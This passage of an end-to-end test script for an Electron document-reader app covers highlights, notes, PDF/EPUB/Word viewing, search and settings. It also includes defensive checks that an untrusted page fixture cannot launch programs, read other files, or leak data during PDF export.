  const esFrame = page.frames().find((fr) => fr.url().startsWith('doc://'))
  check((await esFrame.evaluate(() => scrollY)) > 1000, 'clicking an outline item scrolls the page')
  check((await page.textContent('.outline-item.active'))?.includes('Concurrency'), 'outline highlights the section being read')
  await page.screenshot({ path: shot('8-outline') })

  // 15. Reading position is remembered per document.
  step("15. Reading position")
  await openDoc('React useEffect — khi nào chạy?')
  await page.waitForSelector('.markdown h2')
  await page.evaluate(() => (document.querySelector('.md-scroll').scrollTop = 220))
  await page.waitForTimeout(600)
  await openDoc('Lộ trình Backend')
  await openDoc('React useEffect — khi nào chạy?')
  await page.waitForTimeout(1200)
  const restored = await page.evaluate(() => document.querySelector('.md-scroll').scrollTop)
  check(Math.abs(restored - 220) < 5, `reading position restored (${restored}px)`)

  // 16. Back / forward: header buttons, Alt+←/→, and Alt+← typed inside an HTML page.
  step("16. Back / forward")
  await page.click('.history-buttons .icon-btn[title^="Quay lại"]')
  await docPathIs(ROADMAP)
  await page.click('.doc-heading h1')
  await page.keyboard.press('Alt+ArrowRight')
  await docPathIs(REACT)
  await page.keyboard.press('Alt+ArrowLeft')
  await docPathIs(ROADMAP)
  check(true, 'back/forward buttons and Alt+←/→ work')
  await page.frameLocator('iframe.html-frame').locator('h1').click()
  await page.keyboard.press('Alt+ArrowLeft')
  // History: ... ES, REACT, ROADMAP, REACT; we are on ROADMAP, so back goes to REACT.
  await docPathIs(REACT)
  check(true, 'Alt+← works while the HTML page has the focus')

  // 17. Export to PDF (HTML and Markdown), in light colours even in dark mode; open the PDF in the app.
  step("17. Export PDF")
  const exportTo = async (title, target) => {
    await app.evaluate(({ dialog }, p) => {
      dialog.showSaveDialog = async () => ({ canceled: false, filePath: p }) // a test can't click the native dialog
    }, target)
    await openDoc(title)
    await page.click('.more > .btn')
    await page.click('.popover.menu >> text=Xuất PDF…')
    // Wait for the toast naming this file (an earlier export's toast may still be showing).
    await page.waitForSelector(`.toast.info >> text=${path.basename(target)}`, { timeout: 30000 })
  }
  await page.evaluate(async () => window.api.setUiSettings({ ...(await window.api.getUiSettings()), theme: 'dark' }))
  const esPdf = file('backend/Event Sourcing.pdf')
  const mdPdf = file('frontend/React useEffect.pdf')
  await exportTo('Event Sourcing — Bài học để chép vào vở', esPdf)
  await exportTo('React useEffect — khi nào chạy?', mdPdf)
  await page.evaluate(async () => window.api.setUiSettings({ ...(await window.api.getUiSettings()), theme: 'system' }))
  for (const [label, p] of [['HTML', esPdf], ['Markdown', mdPdf]]) {
    const bytes = readFileSync(p)
    check(bytes.subarray(0, 5).toString() === '%PDF-' && bytes.length > 20000, `${label} exported to a valid PDF (${Math.round(bytes.length / 1024)} KB)`)
  }
  // The exported PDFs land in the library, so they show up in the tree.
  await page.waitForFunction(() => document.querySelectorAll('.doc-list .row.doc .kind-pdf').length === 2, null, { timeout: 5000 })
  // Issue #19: PDFs are shown with pdf.js (pages drawn on canvas + a text layer).
  await page.click('.doc-list .row.doc:has(.kind-pdf) >> text=React useEffect')
  await page.waitForSelector('.pdf-page canvas')
  await page.waitForSelector('.pdf-page .textLayer span')
  check((await page.textContent('.pdf-page .textLayer')).includes('useEffect'), 'PDF opens in the app with pdf.js, with selectable text')
  await page.screenshot({ path: shot('9-pdf-viewer-md') })
  await page.click('.doc-list .row.doc:has(.kind-pdf) >> text=Event Sourcing')
  await page.waitForSelector('.pdf-page canvas')
  await page.waitForFunction(() => document.querySelectorAll('.outline .outline-item').length > 3, null, { timeout: 10000 })
  check(true, 'PDF bookmarks are shown in the outline')
  await page.screenshot({ path: shot('10-pdf-viewer-html') })

  // 18a. Highlights + notes in Markdown: stored next to the doc, the doc itself untouched.
  step('18a. Highlights in Markdown')
  const notesFile = path.join(dataDir(library), 'notes.json')
  const reactBefore = read(REACT)
  await openDoc('React useEffect — khi nào chạy?')
  await page.waitForSelector('.markdown h2')
  /** Selects `text` inside the first element matching `selector` (in the page or a frame) and releases the mouse. */
  const selectText = (target, selector, text) =>
    target.evaluate(
      async ([sel, txt]) => {
        const el = [...document.querySelectorAll(sel)].find((e) => e.textContent.includes(txt))
        // A person selects text they can see. Let the scroll settle first: the app hides the
        // highlight toolbar while scrolling.
        el.scrollIntoView({ block: 'center', behavior: 'instant' })
        await new Promise((r) => setTimeout(r, 400))
        const walker = document.createTreeWalker(el, NodeFilter.SHOW_TEXT)
        for (let n = walker.nextNode(); n; n = walker.nextNode()) {
          const i = n.data.indexOf(txt)
          if (i < 0) continue
          const range = document.createRange()
          range.setStart(n, i)
          range.setEnd(n, i + txt.length)
          const selection = getSelection()
          selection.removeAllRanges()
          selection.addRange(range)
          el.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, button: 0 }))
          return true
        }
        return false
      },
      [selector, text]
    )
  await selectText(page, '.markdown p', 'Mảng phụ thuộc')
  await page.waitForSelector('.hl-toolbar')
  await page.screenshot({ path: shot('11-highlight-toolbar') })
  await page.click('.hl-toolbar .hl-swatch[title="Highlight vàng"]')
  await page.waitForSelector('.markdown mark[data-sd-ann]')
  check((await page.textContent('.markdown mark[data-sd-ann]')) === 'Mảng phụ thuộc', 'Markdown: selected text is highlighted')
  await selectText(page, '.markdown blockquote p', 'cleanup')
  await page.click('.hl-toolbar .hl-note-btn')
  await page.waitForSelector('.note-popover textarea')
  await page.fill('.note-popover textarea', 'Nhớ: effect trả về hàm dọn dẹp.')
  await page.keyboard.press('Control+Enter')
  await page.waitForSelector('.note-popover', { state: 'detached' })
  const mdNotes = JSON.parse(readFileSync(notesFile, 'utf8')).docs[REACT]?.items ?? []
  check(mdNotes.length === 2 && mdNotes.some((a) => a.note.startsWith('Nhớ:')), 'Markdown: highlight + note saved in the data folder')
  check(read(REACT) === reactBefore, 'Markdown: the document file is not changed by highlighting')
  await page.click('.panel-tabs >> text=Ghi chú')
  await page.waitForSelector('.note-card-text >> text=Nhớ: effect trả về hàm dọn dẹp.')
  check(true, 'notes panel lists the note')
  await page.screenshot({ path: shot('12-notes-panel') })
  // Searching the notes: quote and note text, without accents.
  await page.fill('.note-search input', 'don dep')
  await page.waitForFunction(() => document.querySelectorAll('.note-card').length === 1)
  check((await page.textContent('.note-search-count')) === '1/2', 'searching the notes (no accents) keeps only the matching one')
  await page.fill('.note-search input', 'không có chữ này')
  await page.waitForSelector('.note-card', { state: 'detached' })
  await page.fill('.note-search input', '')
  await page.waitForFunction(() => document.querySelectorAll('.note-card').length === 2)
  check(true, 'clearing the search shows every note again')

  // 18b. A highlight is found again after the document is edited elsewhere.
  step('18b. Highlight survives an edit')
  writeFileSync(file(REACT), read(REACT).replace('# React useEffect', '# React useEffect\n\nĐoạn mới thêm vào đầu bài.'))
  await page.waitForFunction(() => document.querySelector('.markdown')?.textContent.includes('Đoạn mới thêm'), null, { timeout: 5000 })
  await page.waitForTimeout(500)
  check((await page.locator('.markdown mark[data-sd-ann]').count()) >= 2, 'highlights are found again after the file changed')

  // 18c. Highlights in an HTML page (inside the sandboxed iframe).
  step('18c. Highlights in HTML')
  await openDoc('Event Sourcing — Bài học để chép vào vở')
  await page.frameLocator('iframe.html-frame').locator('h1').waitFor()
  await page.waitForTimeout(500)
  const htmlFrame = () => page.frames().find((fr) => fr.url().startsWith('doc://') && fr.url().includes('Event%20Sourcing.html'))
  await selectText(htmlFrame(), 'p', 'append-only')
  await page.waitForSelector('.hl-toolbar')
  await page.click('.hl-toolbar .hl-swatch[title="Highlight xanh dương"]')
  await page.waitForTimeout(500)
  check((await htmlFrame().evaluate(() => document.querySelector('mark[data-sd-ann]')?.textContent)) === 'append-only', 'HTML: selected text is highlighted inside the page')
  await openDoc('Lộ trình Backend')
  await openDoc('Event Sourcing — Bài học để chép vào vở')
  await page.waitForTimeout(1500)
  check((await htmlFrame().evaluate(() => document.querySelectorAll('mark[data-sd-ann]').length)) === 1, 'HTML: highlight is drawn again when the page is reopened')

  // 18d. Export with highlights and notes.
  step('18d. Export PDF with notes')
  const notesPdf = file('frontend/React useEffect (ghi chú).pdf')
  await app.evaluate(({ dialog }, p) => {
    dialog.showSaveDialog = async () => ({ canceled: false, filePath: p })
  }, notesPdf)
  await openDoc('React useEffect — khi nào chạy?')
  await page.click('.more > .btn')
  await page.click('.popover.menu >> text=Xuất PDF kèm highlight và ghi chú…')
  await page.waitForSelector('.toast.info >> text=React useEffect (ghi chú).pdf', { timeout: 30000 })
  const notesBytes = readFileSync(notesPdf)
  check(notesBytes.subarray(0, 5).toString() === '%PDF-', `PDF with notes exported (${Math.round(notesBytes.length / 1024)} KB)`)
  await page.waitForFunction(() => document.querySelectorAll('.doc-list .row.doc .kind-pdf').length === 3, null, { timeout: 5000 })
  await page.click('.doc-list .row.doc:has(.kind-pdf) >> text=React useEffect (ghi chú)')
  await page.waitForSelector('.pdf-page .textLayer span')
  await page.waitForTimeout(500)
  await page.screenshot({ path: shot('13-pdf-with-notes') })

  // 18f. Issue #19: highlight, note, Ctrl+F and full-text search in a PDF.
  step('18f. PDF highlights, find and search')
  // A word as pdf.js laid it out (the PDF decides how text is split into pieces).
  const pdfWord = await page.evaluate(() => {
    const span = [...document.querySelectorAll('.pdf-page[data-page="1"] .textLayer span')].find((s) => /^\p{L}{6,}$/u.test(s.textContent.trim().split(/\s+/)[0] ?? ''))
    return span.textContent.trim().split(/\s+/)[0]
  })
  await selectText(page, '.pdf-page[data-page="1"] .textLayer span', pdfWord)
  await page.waitForSelector('.hl-toolbar')
  await page.click('.hl-toolbar .hl-swatch[title="Highlight xanh lá"]')
  await page.waitForSelector('.textLayer mark[data-sd-ann]')
  const pdfNotes = JSON.parse(readFileSync(notesFile, 'utf8')).docs['frontend/React useEffect (ghi chú).pdf']?.items ?? []
  check(pdfNotes.length === 1 && pdfNotes[0].page === 1 && pdfNotes[0].quote === pdfWord, `PDF: highlight saved with its page ("${pdfWord}")`)
  await page.keyboard.press('Control+F')
  await page.fill('.find-bar input', 'phu thuoc')
  await page.waitForFunction(() => /^\d+\/\d+$/.test(document.querySelector('.find-count')?.textContent ?? ''), null, { timeout: 15000 })
  const pdfFind = await page.textContent('.find-count')
  check(/^1\/\d+$/.test(pdfFind) && (await page.evaluate(() => CSS.highlights.get('sd-find')?.size ?? 0)) > 0, `PDF: Ctrl+F finds text in the PDF (${pdfFind})`)
  await page.press('.find-bar input', 'Escape')
  await page.fill('.search input', 'React vẽ xong')
  await page.waitForFunction(() => [...document.querySelectorAll('.hit')].some((h) => h.querySelector('.kind-pdf') && h.querySelector('.hit-snippet')), null, { timeout: 30000 })
  check(true, 'search finds text inside PDFs, with a snippet')
  await page.fill('.search input', '')

  // 18e. EPUB books: chapters in the outline, search inside the book, highlights.
  step('18e. EPUB')
  await page.fill('.search input', 'pull truoc khi push')
  await page.waitForSelector('.hit')
  check((await page.textContent('.hit .hit-title')).includes('Git cơ bản'), 'search finds text inside an EPUB book')
  await page.click('.hit')
  await page.fill('.search input', '')
  await page.click('.panel-tabs >> text=Mục lục') // the panel remembers the last tab (Ghi chú, from 18a)
  await page.waitForFunction(() => document.querySelectorAll('.outline-item').length === 3, null, { timeout: 10000 })
  check(true, 'EPUB chapters are listed in the outline')
  const bookFrame = () => page.frames().find((fr) => fr.url() === 'about:srcdoc')
  await page.waitForTimeout(800)
  check((await bookFrame().evaluate(() => document.body.textContent)).includes('Git là gì?'), 'EPUB: first chapter is shown')
  await page.click('.outline-item >> text=Chương 3')
  await page.waitForTimeout(1200)
  check((await bookFrame().evaluate(() => document.body.textContent)).includes('pull trước khi push'), 'EPUB: outline jumps to a chapter')
  await bookFrame().evaluate(() => {
    const p = [...document.querySelectorAll('p')].find((e) => e.textContent.includes('Quy tắc vàng'))
    const range = document.createRange()
    range.selectNodeContents(p.querySelector('strong'))
    getSelection().removeAllRanges()
    getSelection().addRange(range)
  })
  await page.waitForSelector('.hl-toolbar', { timeout: 5000 })
  await page.click('.hl-toolbar .hl-swatch[title="Highlight xanh lá"]')
  await page.waitForTimeout(800)
  const bookNotes = JSON.parse(readFileSync(notesFile, 'utf8')).docs['sach/Git cơ bản.epub']?.items ?? []
  check(bookNotes.length === 1 && bookNotes[0].cfi?.startsWith('epubcfi(') && bookNotes[0].quote === 'pull trước khi push', 'EPUB: highlight saved with its position in the book')
  await page.screenshot({ path: shot('14-epub') })

  // Issue #20: Kindle books (MOBI/AZW3) open in the same reader, with outline, highlights, search.
  step('18g. Kindle book')
  await page.fill('.search input', 'volume de giu du lieu')
  await page.waitForFunction(() => [...document.querySelectorAll('.hit')].some((h) => h.textContent.includes('Docker nhanh')), null, { timeout: 30000 })
  check(true, 'search finds text inside a Kindle book')
  await page.fill('.search input', '')
  await openDoc('Docker nhanh')
  await page.waitForFunction(() => document.querySelectorAll('.outline-item').length === 3, null, { timeout: 15000 })
  check((await page.locator('.outline-item').allTextContents()).join('|').includes('Chương 2. Image và Dockerfile'), 'Kindle book: chapters listed in the outline')
  await page.click('.outline-item >> text=Chương 3')
  await page.waitForTimeout(1200)
  check((await bookFrame().evaluate(() => document.body.textContent)).includes('Dùng volume để giữ dữ liệu'), 'Kindle book: outline jumps to a chapter')
  await bookFrame().evaluate(() => {
    const b = [...document.querySelectorAll('b')].find((e) => e.textContent === 'volume')
    const range = document.createRange()
    range.selectNodeContents(b)
    getSelection().removeAllRanges()
    getSelection().addRange(range)
  })
  await page.waitForSelector('.hl-toolbar', { timeout: 5000 })
  await page.click('.hl-toolbar .hl-swatch[title="Highlight vàng"]')
  await page.waitForTimeout(800)
  const kindleNotes = JSON.parse(readFileSync(notesFile, 'utf8')).docs['sach/Docker nhanh.mobi']?.items ?? []
  check(kindleNotes.length === 1 && kindleNotes[0].cfi?.startsWith('epubcfi(') && kindleNotes[0].quote === 'volume', 'Kindle book: highlight saved with its position')
  await page.screenshot({ path: shot('14b-kindle') })

  // Outline follows the page being read, also for sections inside one file.
  step('18h. Book outline follows the reading position')
  await openDoc('Sách một file')
  await page.waitForFunction(() => document.querySelectorAll('.outline-item').length === 3, null, { timeout: 15000 })
  const activeItem = () => page.evaluate(() => document.querySelector('.outline-item.active')?.textContent ?? '')
  await page.waitForFunction(() => document.querySelector('.outline-item.active')?.textContent === 'Phần 1', null, { timeout: 10000 })
  await page.click('.outline-item >> text=Phần 3')
  await page.waitForFunction(() => document.querySelector('.outline-item.active')?.textContent === 'Phần 3', null, { timeout: 10000 }).catch(() => {})
  check((await activeItem()) === 'Phần 3', `outline highlights the section shown (${await activeItem()})`)
  await page.click('.epub-bar .icon-btn >> nth=0') // previous page: the end of section 2
  await page.waitForTimeout(800)
  check((await activeItem()) === 'Phần 2', `turning back a page highlights the section before (${await activeItem()})`)

  // One page or two side by side (Settings > Đọc sách), on a wide window.
  step('18i. One or two pages')
  /** Text of the first paragraph on screen. */
  const shownText = () =>
    page.evaluate(() => {
      const host = document.querySelector('.epub-host').getBoundingClientRect()
      const frame = document.querySelector('.epub-host iframe')
      const box = frame.getBoundingClientRect()
      const p = [...frame.contentDocument.querySelectorAll('p')].find((el) => {
        const x = box.left + el.getBoundingClientRect().left
        return x >= host.left && x < host.right
      })
      return p?.textContent ?? ''
    })
  await page.setViewportSize({ width: 2000, height: 1000 })
  await page.waitForTimeout(1500)
  const pagesShown = () =>
    page.evaluate(() => {
      const host = document.querySelector('.epub-host')
      const frame = host.querySelector('iframe')
      const col = parseFloat(getComputedStyle(frame.contentDocument.body).columnWidth)
      return Math.round(host.clientWidth / col)
    })
  const wide = await pagesShown()
  await page.click('.sidebar-head .icon-btn[title="Cài đặt"]')
  await settingsTab('Đọc')
  await page.click('dialog.settings >> text=Một trang')
  await page.click('dialog.settings >> text=Xong')
  await page.waitForTimeout(1500)
  const single = await pagesShown()
  check(wide === 2 && single === 1, `wide window: 2 pages by default, 1 page after choosing "Một trang" (${wide} -> ${single})`)
  // Switching keeps the reading position (and the outline in step with it).
  const firstShown = await shownText()
  check(firstShown.includes('phần 2') && (await activeItem()) === 'Phần 2', `changing the page layout keeps your place ("${firstShown.slice(0, 20)}…", outline: ${await activeItem()})`)
  await page.screenshot({ path: shot('14c-epub-single') })
  await page.setViewportSize({ width: 1320, height: 860 })
  await page.waitForTimeout(500)

  // Word, plain text and pictures.
  step('18j. Word documents, text files, pictures')
  await page.fill('.search input', 'align-items')
  await page.waitForFunction(() => [...document.querySelectorAll('.hit')].some((h) => h.querySelector('.kind-docx') && h.querySelector('.hit-snippet')), null, { timeout: 30000 })
  check(true, 'search finds text inside Word documents')
  await page.fill('.search input', '')
  // Word layout (docx-preview) by default: pages, Word's headings in the outline.
  await openDoc('CSS Flexbox — ghi chú')
  await page.waitForSelector('iframe.docx-frame', { timeout: 20000 })
  const inDocx = (selector) => page.waitForFunction((sel) => !!document.querySelector('iframe.docx-frame')?.contentDocument?.querySelector(sel), selector, { timeout: 20000 })
  await inDocx('section.docx')
  // The .docx's own CSS stays inside the frame, where no script can run and nothing loads from outside.
  const isolation = await page.evaluate(() => ({
    sandbox: document.querySelector('iframe.docx-frame').getAttribute('sandbox'),
    leaked: [...document.querySelectorAll('style')].some((st) => st.textContent.includes('docx-wrapper'))
  }))
  check(isolation.sandbox === 'allow-same-origin' && !isolation.leaked, `Word layout is drawn in an isolated frame (sandbox: ${isolation.sandbox}; styles in the app page: ${isolation.leaked})`)
  await page.click('.panel-tabs >> text=Mục lục')
  await page.waitForFunction(() => document.querySelectorAll('.outline-item').length === 3, null, { timeout: 10000 })
  const outlineTexts = await page.locator('.outline-item').allTextContents()
  check(outlineTexts.join('|') === 'CSS Flexbox|Trục chính và trục phụ|Khi nào dùng Grid', `Word layout: pages drawn, headings in the outline (${outlineTexts.join(', ')})`)
  await page.evaluate((txt) => {
    const doc = document.querySelector('iframe.docx-frame').contentDocument
    const span = [...doc.querySelectorAll('span')].find((e) => e.textContent === txt)
    const range = doc.createRange()
    range.selectNodeContents(span)
    doc.getSelection().removeAllRanges()
    doc.getSelection().addRange(range)
    span.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, button: 0 }))
  }, 'CSS Grid')
  await page.waitForSelector('.hl-toolbar')
  await page.click('.hl-toolbar .hl-swatch[title="Highlight vàng"]')
  await inDocx('mark[data-sd-ann]')
  const docxNotes = JSON.parse(readFileSync(notesFile, 'utf8')).docs['frontend/CSS Flexbox.docx']?.items ?? []
  check(docxNotes.length === 1 && docxNotes[0].quote === 'CSS Grid', 'Word: highlights are saved (the file is not changed)')
  await page.keyboard.press('Control+F')
  await page.fill('.find-bar input', 'truc')
  await page.waitForFunction(() => /^\d+\/\d+$/.test(document.querySelector('.find-count')?.textContent ?? ''), null, { timeout: 10000 })
  check((await page.textContent('.find-count')) === '1/5', `Word: Ctrl+F (${await page.textContent('.find-count')})`)
  await page.press('.find-bar input', 'Escape')
  await page.screenshot({ path: shot('15-docx') })
  // The simple view (mammoth) is one click away, and the highlight is found there too.
  await page.click('.docx-note >> text=Xem đơn giản')
  await page.waitForSelector('.article-docx h1')
  await page.waitForSelector('.article-docx mark[data-sd-ann]')
  check((await page.textContent('.article-docx strong')) === 'một trục', 'Word simple view: headings, bold text, and the same highlight')
  await page.screenshot({ path: shot('15b-docx-simple') })
  await page.click('.docx-note >> text=Bố cục Word')
  await page.waitForSelector('iframe.docx-frame')

  await openDoc('Lệnh Git hay dùng')
  await page.waitForSelector('.article-txt pre.plain-text')
  check((await page.textContent('.article-txt')).includes('git add -p'), 'text file is shown as it is')

  await openDoc('Sơ đồ CQRS')
  await page.waitForFunction(() => (document.querySelector('.image-view img')?.naturalWidth ?? 0) > 0)
  const fitZoom = await page.textContent('.pdf-zoom-value')
  await page.click('.image-view .icon-btn[title^="Phóng to"]')
  const zoomed = await page.textContent('.pdf-zoom-value')
  check(fitZoom !== zoomed && (await page.textContent('.image-size')) === '640 × 260', `picture is shown and can be zoomed (${fitZoom} -> ${zoomed})`)
  await page.screenshot({ path: shot('16-image') })

  // Settings: hide pictures from the list; only the middle of the dialog scrolls.
  await page.click('.sidebar-head .icon-btn[title="Cài đặt"]')
  const tabs = await page.locator('dialog.settings .settings-tabs [role=tab]').allTextContents()
  const dialogScroll = await page.evaluate(() => {
    const d = document.querySelector('dialog.settings')
    return d.scrollHeight - d.clientHeight
  })
  check(tabs.length === 5 && dialogScroll <= 1, `settings are split into tabs (${tabs.join(', ')}); the dialog itself never scrolls`)
  await settingsTab('Thư viện')
  await page.click('dialog.settings .setting-row:has-text("File ảnh") >> text=Ẩn')
  await page.waitForFunction(() => ![...document.querySelectorAll('.doc-list .row.doc')].some((r) => r.textContent.includes('Sơ đồ CQRS')))
  check(true, 'pictures can be hidden from the list')
  await page.click('dialog.settings .setting-row:has-text("File ảnh") >> text=Hiện')
  await page.click('dialog.settings >> text=Xong')

  // 19. Issue #1: a page can't open programs, and asks before opening other files.
  step('19. Safety: opening files from a page')
  await app.evaluate(({ shell, dialog }) => {
    globalThis.__real = { openPath: shell.openPath, showItemInFolder: shell.showItemInFolder }
    globalThis.__opened = []
    globalThis.__revealed = []
    shell.openPath = async (p) => (globalThis.__opened.push(p), '')
    shell.showItemInFolder = (p) => globalThis.__revealed.push(p)
  })
  await setAnswer('dismiss') // the app asks in its own dialog; answer "Không"
  const askedBefore = await page.evaluate(() => window.__smokeAsked)
  const attackId = await page.evaluate(async (rel) => (await window.api.getLibrary()).docs.find((d) => d.rel === rel).path, ATTACK)
  await page.evaluate((id) => window.api.markOpened(id), attackId)
  await openDoc('Tài liệu lạ')
  await page.waitForTimeout(800)
  const runInPage = (hash) =>
    page.frames().find((fr) => fr.url().includes('T%C3%A0i%20li%E1%BB%87u%20l%E1%BA%A1.html')).evaluate((h) => (location.hash = h), hash)
  await runInPage('#run-py')
  await page.waitForTimeout(800)
  const afterPy = await app.evaluate(() => ({ opened: globalThis.__opened.length, revealed: globalThis.__revealed.length }))
  check(afterPy.opened === 0 && afterPy.revealed === 1, 'a page navigating to a .py file only shows it in Explorer, never runs it')
  await openDoc('Tài liệu lạ')
  await page.waitForTimeout(800)
  await runInPage('#run-txt')
  await page.waitForTimeout(800)
  const afterTxt = { opened: await app.evaluate(() => globalThis.__opened.length), asked: (await page.evaluate(() => window.__smokeAsked)) - askedBefore }
  check(afterTxt.asked === 1 && afterTxt.opened === 0, 'a page opening a .pptx file (not read by the app) asks first (answered "Không": nothing opened)')
  await app.evaluate(({ shell, dialog }) => {
    Object.assign(shell, { openPath: globalThis.__real.openPath, showItemInFolder: globalThis.__real.showItemInFolder })
  })

  // 20. Issue #2: when exporting to PDF the page can't read other files; hidden files are never served.
  step('20. Safety: export window and hidden files')
  const readIn = (url) =>
    app.evaluate(async ({ BrowserWindow }, u) => {
      const w = new BrowserWindow({ show: false, webPreferences: { sandbox: true } })
      try {
        await w.loadURL(u)
        await new Promise((r) => setTimeout(r, 1500))
        return await w.webContents.executeJavaScript('document.body.dataset.result || ""')
      } finally {
        w.destroy()
      }
    }, url)
  const attackUrl = 'doc://library/' + attackId.split('/').map(encodeURIComponent).join('/')
  check((await readIn(attackUrl + '?print=1')) === 'blocked,blocked', 'export window: the page cannot fetch other files')
  check((await readIn(attackUrl)).startsWith('status404'), 'hidden files (.docs-meta.json) are never served')

  // Review: the export window may not reach the internet (it could send pictures of the library out).
  step('20b. Export window has no network; pages cannot flood the browser with tabs')
  const leakId = await page.evaluate(async () => (await window.api.getLibrary()).docs.find((d) => d.rel === 'backend/Ảnh từ web.html').path)
  await openDoc('Ảnh từ web')
  await page.waitForTimeout(1500)
  const viewHits = webHits.length
  webHits.length = 0
  const leakPdf = path.join(workDir, 'leak.pdf')
  await app.evaluate(({ dialog }, file) => {
    globalThis.__realSave2 = dialog.showSaveDialog
    dialog.showSaveDialog = async () => ({ canceled: false, filePath: file })
  }, leakPdf)
  await page.evaluate((id) => window.api.exportPdf(id, false), leakId)
  await app.evaluate(({ dialog }) => (dialog.showSaveDialog = globalThis.__realSave2))
  check(
    viewHits > 0 && existsSync(leakPdf) && webHits.length === 1 && webHits[0] === '/own-picture.svg',
    `export to PDF loads only the pictures written in the file, nothing a script makes up (exporting: ${webHits.join(', ')})`
  )

  await app.evaluate(({ shell }) => {
    globalThis.__realExternal = shell.openExternal
    globalThis.__tabs = []
    shell.openExternal = async (u) => void globalThis.__tabs.push(u)
  })
  await setAnswer('dismiss') // the 3rd tab asks; answer "Chặn"
  const askedBeforeTabs = await page.evaluate(() => window.__smokeAsked)
  await openDoc('Tài liệu lạ')
  await page.waitForTimeout(800)
  await page.frames().find((fr) => fr.url().includes('T%C3%A0i%20li%E1%BB%87u%20l%E1%BA%A1.html')).evaluate(() => (location.hash = '#popups'))
  await page.waitForTimeout(1200)
  const openedTabs = await app.evaluate(({ shell }) => ((shell.openExternal = globalThis.__realExternal), globalThis.__tabs))
  const tabAsks = (await page.evaluate(() => window.__smokeAsked)) - askedBeforeTabs
  check(openedTabs.length === 2 && tabAsks === 1, `a page opening 5 tabs at once: 2 open, the 3rd asks, the rest are dropped (opened ${openedTabs.length}, asked ${tabAsks})`)

  // 21. Issue #3: the raw editor keeps CRLF line endings and doesn't rewrite an unchanged file.
  step('21. Raw editor keeps CRLF')
  const crlfBefore = readFileSync(file(CRLF), 'utf8')
  const mtimeBefore = (await import('node:fs')).statSync(file(CRLF)).mtimeMs
  await openDoc('Windows note')
  await page.click('.doc-controls >> text=Raw')
  await page.waitForFunction(() => document.querySelector('.cm-content')?.textContent.includes('Dòng hai'))
  await page.click('.raw-host .cm-content')
  await page.keyboard.press('Control+S')
  await page.waitForTimeout(600)
  check((await import('node:fs')).statSync(file(CRLF)).mtimeMs === mtimeBefore, 'Ctrl+S without changes does not rewrite the file')
  await page.keyboard.press('Control+End')
  await page.keyboard.type('x')
  await page.keyboard.press('Backspace')
  await page.waitForTimeout(300)
  check((await page.locator('.raw-toolbar .dirty-dot').count()) === 0, 'typing then deleting a character is not "unsaved"')
  await page.keyboard.type('Dòng ba.')
  await page.keyboard.press('Enter')
  await page.keyboard.press('Control+S')
  await page.waitForFunction(() => !document.querySelector('.raw-toolbar .dirty-dot'), null, { timeout: 5000 })
  const crlfAfter = readFileSync(file(CRLF), 'utf8')
  check(
    crlfAfter.startsWith(crlfBefore) && crlfAfter.includes('Dòng ba.\r\n') && !/[^\r]\n/.test(crlfAfter),
    'saving keeps CRLF line endings everywhere'
  )
  await page.click('.raw-toolbar >> text=Đóng raw')

  // 22. Issue #17: Ctrl+F in Markdown, HTML (inside the page) and EPUB (whole book).
  step('22. Find in document')
  const findCount = async () => (await page.textContent('.find-count'))?.trim()
  const typeFind = async (q) => {
    await page.keyboard.press('Control+F')
    await page.waitForSelector('.find-bar input')
    await page.fill('.find-bar input', q)
    await page.waitForFunction(() => /\d+\/\d+|Không thấy/.test(document.querySelector('.find-count')?.textContent ?? ''), null, { timeout: 15000 })
  }
  await openDoc('React useEffect — khi nào chạy?')
  await page.waitForSelector('.markdown h2')
  await page.click('.doc-heading h1')
  await typeFind('effect')
  const mdCount = await findCount()
  await page.press('.find-bar input', 'Enter')
  check(/^1\/([2-9]|\d{2,})$/.test(mdCount) && (await findCount()) === '2/' + mdCount.split('/')[1], `Markdown: Ctrl+F finds and steps through matches (${mdCount})`)
  await page.press('.find-bar input', 'Escape')
  check((await page.locator('.find-bar').count()) === 0, 'Escape closes the find bar')

  // Issue #18: coloured code and KaTeX formulas (with their fonts) in Markdown.
  const mdLook = await page.evaluate(async () => {
    await document.fonts.ready
    const kw = document.querySelector('.markdown pre .hljs-keyword')
    return {
      keyword: kw ? getComputedStyle(kw).color : null,
      inline: document.querySelectorAll('.markdown .katex').length,
      display: document.querySelectorAll('.markdown .katex-display').length,
      errors: document.querySelectorAll('.markdown .katex-error').length,
      font: document.fonts.check('16px KaTeX_Main')
    }
  })
  check(mdLook.keyword === 'rgb(255, 123, 114)', `Markdown: code blocks are coloured (${mdLook.keyword})`)
  check(mdLook.inline >= 3 && mdLook.display === 1 && mdLook.errors === 0 && mdLook.font, `Markdown: formulas drawn with KaTeX (${JSON.stringify(mdLook)})`)
  await page.screenshot({ path: shot('22-markdown-code-math') })

  await openDoc('Event Sourcing — Bài học để chép vào vở')
  await page.frameLocator('iframe.html-frame').locator('h1').waitFor()
  await page.waitForTimeout(500)
  await page.frameLocator('iframe.html-frame').locator('h1').click()
  await typeFind('su kien') // accent-insensitive, Ctrl+F typed inside the page
  const htmlCount = await findCount()
  const marked = await page
    .frames()
    .find((fr) => fr.url().includes('Event%20Sourcing.html'))
    .evaluate(() => CSS.highlights.get('sd-find')?.size ?? 0)
  check(/^1\/\d+/.test(htmlCount) && marked > 0, `HTML: Ctrl+F inside the page finds "sự kiện" (${htmlCount}, ${marked} marked)`)
  await page.press('.find-bar input', 'Escape')

  await openDoc('Git cơ bản')
  await page.waitForTimeout(2000)
  await typeFind('remote')
  const bookCount = await findCount()
  await page.waitForTimeout(800)
  const bookText = await page.frames().find((fr) => fr.url() === 'about:srcdoc')?.evaluate(() => document.body.textContent)
  check(/^1\/\d+/.test(bookCount) && bookText?.includes('Làm việc với remote'), `EPUB: Ctrl+F searches the whole book and opens the chapter (${bookCount})`)
  await page.press('.find-bar input', 'Escape')

  // 23. Issues #21, #22, #23, #25: document note, Markdown notes, tags, clean-up, recovery, sidebar.
  step('23a. Recover a broken data file')
  const backupName = readdirSync(dataDir(library)).find((f) => f.startsWith('meta.corrupt-'))
  // The user fixed the backup by hand; it has a tag for Event Sourcing and data of a deleted file.
  writeFileSync(path.join(dataDir(library), backupName), JSON.stringify({ version: 1, docs: { [ES]: { tags: ['phục-hồi'], status: 'new' }, 'gone/old.md': { tags: ['cũ'], status: 'done' } } }))
  await page.click('.banner:has-text("Khôi phục…") button')
  await page.waitForSelector('dialog.settings[open] section.recovery') // the Dữ liệu tab opens by itself
  await page.click('section.recovery button:has-text("Gộp lại")')
